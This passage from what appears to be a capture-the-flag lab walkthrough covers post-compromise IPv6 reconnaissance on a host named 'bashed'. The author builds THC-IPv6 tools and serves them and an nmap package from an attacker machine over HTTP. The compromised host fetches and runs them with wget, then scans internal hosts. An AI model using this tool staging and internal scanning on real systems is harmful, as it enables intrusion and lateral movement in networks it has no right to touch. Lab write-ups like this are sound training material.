64 bytes from dead:beef::250:56ff:fe8f:d76e: icmp_seq=2 ttl=64 time=0.603 ms (DUP!)
64 bytes from dead:beef::250:56ff:fe8f:6524: icmp_seq=2 ttl=64 time=0.612 ms (DUP!)
64 bytes from dead:beef::250:56ff:fe8f:fbdf: icmp_seq=2 ttl=64 time=0.614 ms (DUP!)
64 bytes from dead:beef::250:56ff:fe8f:cd94: icmp_seq=2 ttl=64 time=0.778 ms (DUP!)
64 bytes from dead:beef::250:56ff:fe8f:1299: icmp_seq=2 ttl=64 time=0.805 ms (DUP!)
64 bytes from dead:beef::250:56ff:fe8f:39ea: icmp_seq=3 ttl=64 time=0.036 ms
64 bytes from dead:beef::1: icmp_seq=3 ttl=64 time=0.249 ms (DUP!)
64 bytes from dead:beef::f42d:2c8:e958:4f46: icmp_seq=3 ttl=64 time=0.316 ms (DUP!)
64 bytes from dead:beef::250:56ff:fe8f:29df: icmp_seq=3 ttl=64 time=0.321 ms (DUP!)
64 bytes from dead:beef::250:56ff:fe8f:c237: icmp_seq=3 ttl=64 time=0.322 ms (DUP!)
64 bytes from dead:beef::250:56ff:fe8f:d76e: icmp_seq=3 ttl=64 time=0.369 ms (DUP!)
64 bytes from dead:beef::250:56ff:fe8f:8262: icmp_seq=3 ttl=64 time=0.376 ms (DUP!)
64 bytes from dead:beef::250:56ff:fe8f:9c92: icmp_seq=3 ttl=64 time=0.384 ms (DUP!)
64 bytes from dead:beef::250:56ff:fe8f:1e33: icmp_seq=3 ttl=64 time=0.422 ms (DUP!)
64 bytes from dead:beef::250:56ff:fe8f:fa4b: icmp_seq=3 ttl=64 time=0.445 ms (DUP!)
64 bytes from dead:beef::250:56ff:fe8f:1ecd: icmp_seq=3 ttl=64 time=0.502 ms (DUP!)
64 bytes from dead:beef::250:56ff:fe8f:d32c: icmp_seq=3 ttl=64 time=0.519 ms (DUP!)
64 bytes from dead:beef::250:56ff:fe8f:65: icmp_seq=3 ttl=64 time=0.565 ms (DUP!)
64 bytes from dead:beef::250:56ff:fe8f:fbdf: icmp_seq=3 ttl=64 time=0.651 ms (DUP!)
64 bytes from dead:beef::250:56ff:fe8f:239e: icmp_seq=3 ttl=64 time=0.668 ms (DUP!)
64 bytes from dead:beef::250:56ff:fe8f:cd94: icmp_seq=3 ttl=64 time=0.740 ms (DUP!)
64 bytes from dead:beef::250:56ff:fe8f:1299: icmp_seq=3 ttl=64 time=0.810 ms (DUP!)
64 bytes from dead:beef::250:56ff:fe8f:6524: icmp_seq=3 ttl=64 time=0.812 ms (DUP!)
^C
--- ff02::1 ping statistics ---
3 packets transmitted, 3 received, +51 duplicates, 0% packet loss, time 2002ms
rtt min/avg/max/mdev = 0.036/6.589/323.509/43.534 ms
root@bashed:~#
```

```sh
root@bashed:~# ip -6 neigh
dead:beef::250:56ff:fe8f:fbdf dev ens33 lladdr 00:50:56:8f:fb:df STALE
fe80::250:56ff:fe8f:d76e dev ens33 lladdr 00:50:56:8f:d7:6e REACHABLE
dead:beef::250:56ff:fe8f:65 dev ens33 lladdr 00:50:56:8f:00:65 STALE
fe80::250:56ff:fe8f:c237 dev ens33 lladdr 00:50:56:8f:c2:37 REACHABLE
fe80::250:56ff:fe8f:fa4b dev ens33 lladdr 00:50:56:8f:fa:4b REACHABLE
dead:beef::250:56ff:fe8f:239e dev ens33 lladdr 00:50:56:8f:23:9e STALE
dead:beef::250:56ff:fe8f:1e33 dev ens33 lladdr 00:50:56:8f:1e:33 STALE
fe80::250:56ff:fe8f:8262 dev ens33 lladdr 00:50:56:8f:82:62 REACHABLE
fe80::250:56ff:fe8f:9c92 dev ens33 lladdr 00:50:56:8f:9c:92 REACHABLE
fe80::250:56ff:fe8f:1299 dev ens33 lladdr 00:50:56:8f:12:99 REACHABLE
fe80::250:56ff:feaa:d76e dev ens33  FAILED
fe80::250:56ff:fe8f:1ecd dev ens33 lladdr 00:50:56:8f:1e:cd REACHABLE
dead:beef::250:56ff:fe8f:d32c dev ens33 lladdr 00:50:56:8f:d3:2c STALE
dead:beef::250:56ff:fe8f:cd94 dev ens33 lladdr 00:50:56:8f:cd:94 STALE
fe80::250:56ff:fe8f:6524 dev ens33 lladdr 00:50:56:8f:65:24 REACHABLE
dead:beef::250:56ff:fe8f:29df dev ens33 lladdr 00:50:56:8f:29:df STALE
fe80::250:56ff:feaa:4146 dev ens33  FAILED
dead:beef::250:56ff:fe8f:d76e dev ens33 lladdr 00:50:56:8f:d7:6e STALE
fe80::250:56ff:fe8f:fbdf dev ens33 lladdr 00:50:56:8f:fb:df REACHABLE
dead:beef::250:56ff:fe8f:c237 dev ens33 lladdr 00:50:56:8f:c2:37 STALE
dead:beef::250:56ff:fe8f:fa4b dev ens33 lladdr 00:50:56:8f:fa:4b STALE
dead:beef::250:56ff:fe8f:9c92 dev ens33 lladdr 00:50:56:8f:9c:92 STALE
dead:beef::250:56ff:fe8f:8262 dev ens33 lladdr 00:50:56:8f:82:62 STALE
fe80::250:56ff:fe8f:65 dev ens33 lladdr 00:50:56:8f:00:65 REACHABLE
fe80::250:56ff:fe8f:64fe dev ens33 lladdr 00:50:56:8f:64:fe router REACHABLE
dead:beef::1 dev ens33 lladdr 00:50:56:8f:64:fe router STALE
dead:beef::f42d:2c8:e958:4f46 dev ens33 lladdr 00:50:56:8f:71:00 STALE
dead:beef::250:56ff:fe8f:1299 dev ens33 lladdr 00:50:56:8f:12:99 STALE
fe80::250:56ff:fe8f:239e dev ens33 lladdr 00:50:56:8f:23:9e REACHABLE
fe80::250:56ff:fe8f:7100 dev ens33 lladdr 00:50:56:8f:71:00 REACHABLE
fe80::250:56ff:fe8f:1e33 dev ens33 lladdr 00:50:56:8f:1e:33 REACHABLE
dead:beef::250:56ff:fe8f:1ecd dev ens33 lladdr 00:50:56:8f:1e:cd STALE
dead:beef::250:56ff:fe8f:6524 dev ens33 lladdr 00:50:56:8f:65:24 STALE
fe80::250:56ff:fe8f:d32c dev ens33 lladdr 00:50:56:8f:d3:2c REACHABLE
fe80::250:56ff:fe8f:cd94 dev ens33 lladdr 00:50:56:8f:cd:94 REACHABLE
fe80::250:56ff:fe8f:29df dev ens33 lladdr 00:50:56:8f:29:df REACHABLE
root@bashed:~#
root@bashed:~# ip -6 neigh | grep dead:beef
dead:beef::250:56ff:fe8f:fbdf dev ens33 lladdr 00:50:56:8f:fb:df STALE
dead:beef::250:56ff:fe8f:65 dev ens33 lladdr 00:50:56:8f:00:65 STALE
dead:beef::250:56ff:fe8f:239e dev ens33 lladdr 00:50:56:8f:23:9e STALE
dead:beef::250:56ff:fe8f:1e33 dev ens33 lladdr 00:50:56:8f:1e:33 STALE
dead:beef::250:56ff:fe8f:d32c dev ens33 lladdr 00:50:56:8f:d3:2c STALE
dead:beef::250:56ff:fe8f:cd94 dev ens33 lladdr 00:50:56:8f:cd:94 STALE
dead:beef::250:56ff:fe8f:29df dev ens33 lladdr 00:50:56:8f:29:df STALE
dead:beef::250:56ff:fe8f:d76e dev ens33 lladdr 00:50:56:8f:d7:6e STALE
dead:beef::250:56ff:fe8f:c237 dev ens33 lladdr 00:50:56:8f:c2:37 STALE
dead:beef::250:56ff:fe8f:fa4b dev ens33 lladdr 00:50:56:8f:fa:4b STALE
dead:beef::250:56ff:fe8f:9c92 dev ens33 lladdr 00:50:56:8f:9c:92 STALE
dead:beef::250:56ff:fe8f:8262 dev ens33 lladdr 00:50:56:8f:82:62 STALE
dead:beef::1 dev ens33 lladdr 00:50:56:8f:64:fe router STALE
dead:beef::f42d:2c8:e958:4f46 dev ens33 lladdr 00:50:56:8f:71:00 STALE
dead:beef::250:56ff:fe8f:1299 dev ens33 lladdr 00:50:56:8f:12:99 STALE
dead:beef::250:56ff:fe8f:1ecd dev ens33 lladdr 00:50:56:8f:1e:cd STALE
dead:beef::250:56ff:fe8f:6524 dev ens33 lladdr 00:50:56:8f:65:24 STALE
root@bashed:~#
```

[`THC-IPv6 Attack Tool 3.2`](https://packetstormsecurity.com/files/download/140579/thc-ipv6-3.2.tar.gz)

```sh
root@bashed:~# cat /etc/*release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.2 LTS"
NAME="Ubuntu"
VERSION="16.04.2 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04.2 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
VERSION_CODENAME=xenial
UBUNTU_CODENAME=xenial
root@bashed:~#
```

```sh
u64@xenial:~$ sudo apt-get install libpcap0.8-dev
u64@xenial:~$ sudo apt-get install libssl-dev
u64@xenial:~$ wget https://dl.packetstormsecurity.net/groups/thc/thc-ipv6-3.2.tar.gz
u64@xenial:~$ file thc-ipv6-3.2.tar.gz
u64@xenial:~$ tar xvzf thc-ipv6-3.2.tar.gz
u64@xenial:~$ cd thc-ipv6-3.2/
u64@xenial:~/thc-ipv6-3.2$ make
u64@xenial:~/thc-ipv6-3.2$ ls
6to4test.sh            denial6.8          dos-new-ip6.c         fake_dnsupdate6.c  fake_solicitate6.8  flood_router26       fuzz_dhcpc6         inverse_lookup6.c     randicmp6      thc-ipv6.8
address6               denial6.c          dump_dhcp6            fake_mipv6         fake_solicitate6.c  flood_router26.8     fuzz_dhcpc6.8       kill_router6          randicmp6.8    thc-ipv6.h
address6.8             detect-new-ip6     dump_dhcp6.8          fake_mipv6.8       firewall6           flood_router26.c     fuzz_dhcpc6.c       kill_router6.8        randicmp6.c    thc-ipv6-lib.c
address6.c             detect-new-ip6.8   dump_dhcp6.c          fake_mipv6.c       firewall6.8         flood_router6        fuzz_dhcps6         kill_router6.c        README         thc-ipv6-lib.o
alive2map.sh           detect-new-ip6.c   dump_router6          fake_mld26         firewall6.c         flood_router6.8      fuzz_dhcps6.8       LICENSE               redir6         thc-ipv6-setup.sh
alive6                 detect_sniffer6    dump_router6.8        fake_mld26.8       flood_advertise6    flood_router6.c      fuzz_dhcps6.c       LICENSE.OPENSSL       redir6.8       thcping6
alive6.8               detect_sniffer6.8  dump_router6.c        fake_mld26.c       flood_advertise6.8  flood_rs6            fuzz_ip6            local_discovery6.sh   redir6.c       thcping6.8
alive6.c               detect_sniffer6.c  exploit6              fake_mld6          flood_advertise6.c  flood_rs6.8          fuzz_ip6.8          Makefile              redirsniff6    thcping6.c
axfr-reverse.sh        dnsdict6           exploit6.8            fake_mld6.8        flood_dhcpc6        flood_rs6.c          fuzz_ip6.c          ndpexhaust26          redirsniff6.8  thcsyn6
axfr.sh                dnsdict6.8         exploit6.c            fake_mld6.c        flood_dhcpc6.8      flood_solicitate6    grep6.pl            ndpexhaust26.8        redirsniff6.c  thcsyn6.8
CHANGES                dnsdict6.c         extract_hosts6.sh     fake_mldrouter6    flood_dhcpc6.c      flood_solicitate6.8  HOWTO-INJECT        ndpexhaust26.c        rsmurf6        thcsyn6.c
connsplit6.8           dnsdict6.h         extract_networks6.sh  fake_mldrouter6.8  flood_mld26         flood_solicitate6.c  implementation6     ndpexhaust6           rsmurf6.8      toobig6
connsplit6.c           dnsrevenum6        fake_advertise6       fake_mldrouter6.c  flood_mld26.8       four2six             implementation6.8   ndpexhaust6.8         rsmurf6.c      toobig6.8
connsplit6.sh          dnsrevenum6.8      fake_advertise6.8     fake_pim6          flood_mld26.c       four2six.8           implementation6.c   ndpexhaust6.c         sendpees6      toobig6.c
contrib                dnsrevenum6.c      fake_advertise6.c     fake_pim6.8        flood_mld6          four2six.c           implementation6d    node_query6           sendpees6.8    toobigsniff6
covert_send6           dnsrevenum6.sh     fake_dhcps6           fake_pim6.c        flood_mld6.8        fps.h                implementation6d.8  node_query6.8         sendpees6.c    toobigsniff6.8
covert_send6.8         dnssecwalk         fake_dhcps6.8         fake_router26      flood_mld6.c        fragmentation6       implementation6d.c  node_query6.c         sendpeesmp6    toobigsniff6.c
covert_send6.c         dnssecwalk.8       fake_dhcps6.c         fake_router26.8    flood_mldrouter6    fragmentation6.8     inject_alive6       parasite6             sendpeesmp6.8  trace6
covert_send6d          dnssecwalk.c       fake_dns6d            fake_router26.c    flood_mldrouter6.8  fragmentation6.c     inject_alive6.8     parasite6.8           sendpeesmp6.c  trace62list.sh
covert_send6d.8        dnssecwalk.sh      fake_dns6d.8          fake_router6       flood_mldrouter6.c  fragrouter6.8        inject_alive6.c     parasite6.c           six2four.sh    trace6.8
covert_send6d.c        dos_mld6.sh        fake_dns6d.c          fake_router6.8     flood_redir6        fragrouter6.c        INSTALL             passive_discovery6    smurf6         trace6.c
create_network_map.sh  dos-new-ip6        fake_dnsupdate6       fake_router6.c     flood_redir6.8      fragrouter6.h        inverse_lookup6     passive_discovery6.8  smurf6.8
denial6                dos-new-ip6.8      fake_dnsupdate6.8     fake_solicitate6   flood_redir6.c      fragrouter6.sh       inverse_lookup6.8   passive_discovery6.c  smurf6.c
u64@xenial:~/thc-ipv6-3.2$
u64@xenial:~/thc-ipv6-3.2$ ./alive6
./alive6 v3.2 (c) 2017 by van Hauser / THC <vh@thc.org> www.thc.org

Syntax: ./alive6 [-CFHLMPSdlpvV] [-I srcip6] [-i file] [-o file] [-e opt] [-s port,..] [-a port,..] [-u port,..] [-T tag] [-W TIME] interface [unicast-or-multicast-address [remote-router]]

Options:
  -i file    check systems from input file
  -o file    write results to output file
  -d         DNS resolve alive IPv6 addresses
  -M         enumerate hardware addresses (MAC) from input addresses (slow!)
  -C         enumerate common addresses of input networks, -CC for large scan
  -4 ipv4/range  test various IPv4 address encodings per network (eg 1.2.3.4/24)
  -p         send a ping packet for alive check (default)
  -e dst,hop send an errornous packets: destination (default), hop-by-hop
  -s port,port,..  TCP-SYN packet to ports for alive check or "portscan"
  -a port,port,..  TCP-ACK packet to ports for alive check
  -u port,port,..  UDP packet to ports for alive check
  -h         to display more command line options and help (-hh: more options)

Target address on command line or in input file can include ranges in the form
of 2001:db8::1-fff or 2001:db8::1-2:0-ffff:0:0-ffff, etc.
u64@xenial:~/thc-ipv6-3.2$
u64@xenial:~/thc-ipv6-3.2$ cp alive6 ~/
u64@xenial:~/thc-ipv6-3.2$ cd
u64@xenial:~$ ls -l alive6
-rwxrwxr-x 1 u64 u64 123608 Jun  6 16:02 alive6
u64@xenial:~$
```

```sh
root@kali:~/sneaky# scp u64@192.168.1.32:alive6 .
The authenticity of host '192.168.1.32 (192.168.1.32)' can't be established.
ECDSA key fingerprint is SHA256:nE+LwtTjwrb8Wf8GPiUOOJeRciWjeoTRZUNFaPt8X4I.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.1.32' (ECDSA) to the list of known hosts.
u64@192.168.1.32's password:
alive6                                                                                                                                                                    100%  121KB  18.6MB/s   00:00
root@kali:~/sneaky#
root@kali:~/sneaky# ls -l alive6
-rwxr-xr-x 1 root root 123608 Jun  6 19:03 alive6
root@kali:~/sneaky#
```

```sh
root@kali:~/sneaky# python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
10.10.10.68 - - [06/Jun/2018 19:04:20] "GET /alive6 HTTP/1.1" 200 -
```

```sh
root@bashed:~# wget http://10.10.14.16:8000/alive6
--2018-06-06 16:03:51--  http://10.10.14.16:8000/alive6
Connecting to 10.10.14.16:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 123608 (121K) [application/octet-stream]
Saving to: ‘alive6’

alive6                                             100%[================================================================================================================>] 120.71K   193KB/s    in 0.6s

2018-06-06 16:03:52 (193 KB/s) - ‘alive6’ saved [123608/123608]

root@bashed:~#
```

```sh
root@bashed:~# chmod +x alive6
root@bashed:~# ./alive6
./alive6 v3.2 (c) 2017 by van Hauser / THC <vh@thc.org> www.thc.org

Syntax: ./alive6 [-CFHLMPSdlpvV] [-I srcip6] [-i file] [-o file] [-e opt] [-s port,..] [-a port,..] [-u port,..] [-T tag] [-W TIME] interface [unicast-or-multicast-address [remote-router]]

Options:
  -i file    check systems from input file
  -o file    write results to output file
  -d         DNS resolve alive IPv6 addresses
  -M         enumerate hardware addresses (MAC) from input addresses (slow!)
  -C         enumerate common addresses of input networks, -CC for large scan
  -4 ipv4/range  test various IPv4 address encodings per network (eg 1.2.3.4/24)
  -p         send a ping packet for alive check (default)
  -e dst,hop send an errornous packets: destination (default), hop-by-hop
  -s port,port,..  TCP-SYN packet to ports for alive check or "portscan"
  -a port,port,..  TCP-ACK packet to ports for alive check
  -u port,port,..  UDP packet to ports for alive check
  -h         to display more command line options and help (-hh: more options)

Target address on command line or in input file can include ranges in the form
of 2001:db8::1-fff or 2001:db8::1-2:0-ffff:0:0-ffff, etc.
root@bashed:~#
```

```sh
root@bashed:~# ip -6 neigh | wc -l
36
root@bashed:~#
```

```sh
root@bashed:~# ./alive6 ens33 -p ff02::1
Alive: dead:beef::1 [ICMP echo-reply]
Alive: dead:beef::250:56ff:fe8f:29df [ICMP echo-reply]
Alive: dead:beef::250:56ff:fe8f:c237 [ICMP echo-reply]
Alive: dead:beef::250:56ff:fe8f:1ecd [ICMP echo-reply]
Alive: dead:beef::250:56ff:fe8f:fa4b [ICMP echo-reply]
Alive: dead:beef::250:56ff:fe8f:9c92 [ICMP echo-reply]
Alive: dead:beef::250:56ff:fe8f:1299 [ICMP echo-reply]
Alive: dead:beef::f42d:2c8:e958:4f46 [ICMP echo-reply]
Alive: dead:beef::250:56ff:fe8f:239e [ICMP echo-reply]
Alive: dead:beef::250:56ff:fe8f:65 [ICMP echo-reply]
Alive: dead:beef::250:56ff:fe8f:6524 [ICMP echo-reply]
Alive: dead:beef::250:56ff:fe8f:fbdf [ICMP echo-reply]
Alive: dead:beef::250:56ff:fe8f:cd94 [ICMP echo-reply]
Alive: dead:beef::250:56ff:fe8f:d76e [ICMP echo-reply]
Alive: dead:beef::250:56ff:fe8f:1e33 [ICMP echo-reply]
Alive: dead:beef::250:56ff:fe8f:8262 [ICMP echo-reply]
Alive: dead:beef::250:56ff:fe8f:d32c [ICMP echo-reply]

Scanned 1 address and found 17 systems alive
root@bashed:~#
```

```sh
root@bashed:~# ./alive6 ens33 -e ff02::1
Alive: dead:beef::1 [ICMP echo-reply]
Alive: dead:beef::250:56ff:fe8f:8262 [ICMP echo-reply]
Alive: dead:beef::f42d:2c8:e958:4f46 [ICMP echo-reply]
Alive: dead:beef::250:56ff:fe8f:c237 [ICMP echo-reply]
Alive: dead:beef::250:56ff:fe8f:9c92 [ICMP echo-reply]
Alive: dead:beef::250:56ff:fe8f:1e33 [ICMP echo-reply]
Alive: dead:beef::250:56ff:fe8f:29df [ICMP echo-reply]
Alive: dead:beef::250:56ff:fe8f:fa4b [ICMP echo-reply]
Alive: dead:beef::250:56ff:fe8f:1ecd [ICMP echo-reply]
Alive: dead:beef::250:56ff:fe8f:d32c [ICMP echo-reply]
Alive: dead:beef::250:56ff:fe8f:1299 [ICMP echo-reply]
Alive: dead:beef::250:56ff:fe8f:d76e [ICMP echo-reply]
Alive: dead:beef::250:56ff:fe8f:239e [ICMP echo-reply]
Alive: dead:beef::250:56ff:fe8f:6524 [ICMP echo-reply]
Alive: dead:beef::250:56ff:fe8f:65 [ICMP echo-reply]
Alive: dead:beef::250:56ff:fe8f:fbdf [ICMP echo-reply]
Alive: dead:beef::250:56ff:fe8f:cd94 [ICMP echo-reply]
Alive: dead:beef::d420:f590:3abc:76f6 [ICMP parameter problem]
Alive: dead:beef::288c:1b7c:4d75:c027 [ICMP parameter problem]
Alive: dead:beef::d004:4c92:9f3b:b478 [ICMP parameter problem]

Scanned 1 address and found 20 systems alive
root@bashed:~#
```

`[ICMP parameter problem]` are the windows machines

```sh
root@bashed:~# ip -6 neigh | wc -l
42
root@bashed:~#
```

```sh
root@bashed:~# ip -6 neigh | awk '{print $1}' > ipv6.list
root@bashed:~# cat ipv6.list
dead:beef::250:56ff:fe8f:fbdf
fe80::250:56ff:fe8f:d76e
dead:beef::250:56ff:fe8f:65
fe80::250:56ff:fe8f:c237
fe80::250:56ff:fe8f:fa4b
dead:beef::250:56ff:fe8f:239e
dead:beef::250:56ff:fe8f:1e33
fe80::250:56ff:fe8f:8262
fe80::250:56ff:fe8f:9c92
fe80::d420:f590:3abc:76f6
fe80::250:56ff:fe8f:1299
fe80::288c:1b7c:4d75:c027
fe80::250:56ff:feaa:d76e
fe80::250:56ff:fe8f:1ecd
dead:beef::250:56ff:fe8f:d32c
dead:beef::250:56ff:fe8f:cd94
fe80::250:56ff:fe8f:6524
dead:beef::250:56ff:fe8f:29df
fe80::250:56ff:feaa:4146
dead:beef::250:56ff:fe8f:d76e
fe80::907:5aa:214d:4dc8
fe80::250:56ff:fe8f:fbdf
dead:beef::250:56ff:fe8f:c237
dead:beef::250:56ff:fe8f:fa4b
dead:beef::250:56ff:fe8f:9c92
dead:beef::250:56ff:fe8f:8262
fe80::250:56ff:fe8f:65
fe80::250:56ff:fe8f:64fe
dead:beef::d420:f590:3abc:76f6
dead:beef::1
dead:beef::f42d:2c8:e958:4f46
dead:beef::288c:1b7c:4d75:c027
dead:beef::250:56ff:fe8f:1299
fe80::250:56ff:fe8f:239e
fe80::250:56ff:fe8f:7100
fe80::250:56ff:fe8f:1e33
dead:beef::d004:4c92:9f3b:b478
dead:beef::250:56ff:fe8f:1ecd
dead:beef::250:56ff:fe8f:6524
fe80::250:56ff:fe8f:d32c
fe80::250:56ff:fe8f:cd94
fe80::250:56ff:fe8f:29df
root@bashed:~#
```

- Install `Nmap` on `Bashed` by converting `RPM to DEB`

![](images/11.png)

```sh
root@kali:~/sneaky# wget https://nmap.org/dist/nmap-7.70-1.x86_64.rpm
root@kali:~/sneaky# apt-get install alien
root@kali:~/sneaky# alien nmap-7.70-1.x86_64.rpm
nmap_7.70-2_amd64.deb generated
root@kali:~/sneaky# ls -l nmap*
-rw-r--r-- 1 root root 7116160 Mar 20 13:00 nmap-7.70-1.x86_64.rpm
-rw-r--r-- 1 root root 6265068 Jun  6 19:16 nmap_7.70-2_amd64.deb
root@kali:~/sneaky# file nmap_7.70-2_amd64.deb
nmap_7.70-2_amd64.deb: Debian binary package (format 2.0)
root@kali:~/sneaky#
```

```sh
root@kali:~/sneaky# python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
10.10.10.68 - - [06/Jun/2018 19:17:55] "GET /nmap_7.70-2_amd64.deb HTTP/1.1" 200 -
```

```sh
root@bashed:~# wget http://10.10.14.16:8000/nmap_7.70-2_amd64.deb
--2018-06-06 16:17:26--  http://10.10.14.16:8000/nmap_7.70-2_amd64.deb
Connecting to 10.10.14.16:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 6265068 (6.0M) [application/x-debian-package]
Saving to: ‘nmap_7.70-2_amd64.deb’

nmap_7.70-2_amd64.deb                              100%[================================================================================================================>]   5.97M   667KB/s    in 11s

2018-06-06 16:17:38 (547 KB/s) - ‘nmap_7.70-2_amd64.deb’ saved [6265068/6265068]

root@bashed:~#
```

```sh
root@bashed:~# dpkg -i nmap_7.70-2_amd64.deb
dpkg: warning: 'ldconfig' not found in PATH or not executable
dpkg: warning: 'start-stop-daemon' not found in PATH or not executable
dpkg: error: 2 expected programs not found in PATH or not executable
Note: root's PATH should usually contain /usr/local/sbin, /usr/sbin and /sbin
root@bashed:~#
root@bashed:~# echo $PATH
/usr/bin:/bin
root@bashed:~#
root@bashed:~# export PATH=/usr/bin:/bin:/usr/local/sbin:/usr/sbin:/sbin
root@bashed:~# dpkg -i nmap_7.70-2_amd64.deb
Selecting previously unselected package nmap.
(Reading database ... 56472 files and directories currently installed.)
Preparing to unpack nmap_7.70-2_amd64.deb ...
Unpacking nmap (7.70-2) ...
Setting up nmap (7.70-2) ...
Processing triggers for man-db (2.7.5-1) ...
root@bashed:~#
```

```sh
root@bashed:~# nmap -6 -p 22,445,3389,443 -iL ipv6.list
Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-06 16:22 PDT
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for dead:beef::250:56ff:fe8f:fbdf
Host is up (0.00017s latency).

PORT     STATE  SERVICE
22/tcp   open   ssh
443/tcp  closed https
445/tcp  closed microsoft-ds
3389/tcp closed ms-wbt-server
MAC Address: 00:50:56:8F:FB:DF (VMware)

Nmap scan report for dead:beef::250:56ff:fe8f:65
Host is up (0.00020s latency).

PORT     STATE  SERVICE
22/tcp   closed ssh
443/tcp  closed https
445/tcp  closed microsoft-ds
3389/tcp closed ms-wbt-server
MAC Address: 00:50:56:8F:00:65 (VMware)

Nmap scan report for dead:beef::250:56ff:fe8f:239e
Host is up (0.00049s latency).

PORT     STATE  SERVICE
22/tcp   open   ssh
443/tcp  closed https
445/tcp  closed microsoft-ds
3389/tcp closed ms-wbt-server
MAC Address: 00:50:56:8F:23:9E (VMware)

Nmap scan report for dead:beef::250:56ff:fe8f:1e33
Host is up (0.00043s latency).

PORT     STATE    SERVICE
22/tcp   open     ssh
443/tcp  closed   https
445/tcp  filtered microsoft-ds
3389/tcp filtered ms-wbt-server
MAC Address: 00:50:56:8F:1E:33 (VMware)

Nmap scan report for dead:beef::250:56ff:fe8f:d32c
Host is up (0.14s latency).

PORT     STATE  SERVICE
22/tcp   open   ssh
443/tcp  closed https
445/tcp  closed microsoft-ds
3389/tcp closed ms-wbt-server
MAC Address: 00:50:56:8F:D3:2C (VMware)

Nmap scan report for dead:beef::250:56ff:fe8f:cd94
Host is up (0.00027s latency).

PORT     STATE  SERVICE
22/tcp   open   ssh
443/tcp  closed https
445/tcp  closed microsoft-ds
3389/tcp closed ms-wbt-server
MAC Address: 00:50:56:8F:CD:94 (VMware)

Nmap scan report for dead:beef::250:56ff:fe8f:29df
Host is up (0.00061s latency).

PORT     STATE  SERVICE
22/tcp   open   ssh
443/tcp  closed https
445/tcp  closed microsoft-ds
3389/tcp closed ms-wbt-server
MAC Address: 00:50:56:8F:29:DF (VMware)

Nmap scan report for dead:beef::250:56ff:fe8f:d76e
Host is up (0.00021s latency).

PORT     STATE  SERVICE
22/tcp   open   ssh
443/tcp  closed https
445/tcp  closed microsoft-ds
3389/tcp closed ms-wbt-server
MAC Address: 00:50:56:8F:D7:6E (VMware)

Nmap scan report for dead:beef::250:56ff:fe8f:c237
Host is up (0.00040s latency).

PORT     STATE  SERVICE
22/tcp   open   ssh
443/tcp  closed https
445/tcp  closed microsoft-ds
3389/tcp closed ms-wbt-server
MAC Address: 00:50:56:8F:C2:37 (VMware)

Nmap scan report for dead:beef::250:56ff:fe8f:fa4b
Host is up (0.00022s latency).

PORT     STATE    SERVICE
22/tcp   open     ssh
443/tcp  open     https
445/tcp  filtered microsoft-ds
3389/tcp filtered ms-wbt-server
MAC Address: 00:50:56:8F:FA:4B (VMware)

Nmap scan report for dead:beef::250:56ff:fe8f:9c92
Host is up (0.00030s latency).

PORT     STATE  SERVICE
22/tcp   open   ssh
443/tcp  closed https
445/tcp  closed microsoft-ds
3389/tcp closed ms-wbt-server
MAC Address: 00:50:56:8F:9C:92 (VMware)

Nmap scan report for dead:beef::250:56ff:fe8f:8262
Host is up (0.00045s latency).

PORT     STATE  SERVICE
22/tcp   open   ssh
443/tcp  closed https
445/tcp  closed microsoft-ds
3389/tcp closed ms-wbt-server
MAC Address: 00:50:56:8F:82:62 (VMware)

Nmap scan report for dead:beef::d420:f590:3abc:76f6
Host is up (0.00053s latency).

PORT     STATE  SERVICE
22/tcp   closed ssh
443/tcp  open   https
445/tcp  open   microsoft-ds
3389/tcp closed ms-wbt-server
MAC Address: 00:50:56:8F:DB:D9 (VMware)

Nmap scan report for dead:beef::1
Host is up (0.00026s latency).

PORT     STATE    SERVICE
22/tcp   filtered ssh
443/tcp  filtered https
445/tcp  filtered microsoft-ds
3389/tcp filtered ms-wbt-server
MAC Address: 00:50:56:8F:64:FE (VMware)

Nmap scan report for dead:beef::f42d:2c8:e958:4f46
Host is up (0.00026s latency).

PORT     STATE  SERVICE
22/tcp   open   ssh
443/tcp  open   https
445/tcp  closed microsoft-ds
3389/tcp closed ms-wbt-server
MAC Address: 00:50:56:8F:71:00 (VMware)

Nmap scan report for dead:beef::288c:1b7c:4d75:c027
Host is up (0.00042s latency).

PORT     STATE  SERVICE
22/tcp   closed ssh
443/tcp  closed https
445/tcp  open   microsoft-ds
3389/tcp closed ms-wbt-server
MAC Address: 00:50:56:8F:5B:80 (VMware)

Nmap scan report for dead:beef::250:56ff:fe8f:1299
Host is up (0.00037s latency).

PORT     STATE  SERVICE
22/tcp   closed ssh
443/tcp  closed https
445/tcp  closed microsoft-ds
3389/tcp closed ms-wbt-server
MAC Address: 00:50:56:8F:12:99 (VMware)

Nmap scan report for dead:beef::d004:4c92:9f3b:b478
Host is up (0.00055s latency).

PORT     STATE  SERVICE
22/tcp   closed ssh
443/tcp  closed https
445/tcp  open   microsoft-ds
3389/tcp closed ms-wbt-server
MAC Address: 00:50:56:8F:19:CC (VMware)

Nmap scan report for dead:beef::250:56ff:fe8f:1ecd
Host is up (0.00032s latency).

PORT     STATE  SERVICE
22/tcp   open   ssh
443/tcp  closed https
445/tcp  closed microsoft-ds
3389/tcp closed ms-wbt-server
MAC Address: 00:50:56:8F:1E:CD (VMware)

Nmap scan report for dead:beef::250:56ff:fe8f:6524
Host is up (0.00032s latency).

PORT     STATE  SERVICE
22/tcp   open   ssh
443/tcp  open   https
445/tcp  closed microsoft-ds
3389/tcp closed ms-wbt-server
MAC Address: 00:50:56:8F:65:24 (VMware)

Nmap scan report for fe80::250:56ff:fe8f:d76e
Host is up (0.00016s latency).

PORT     STATE  SERVICE
22/tcp   open   ssh
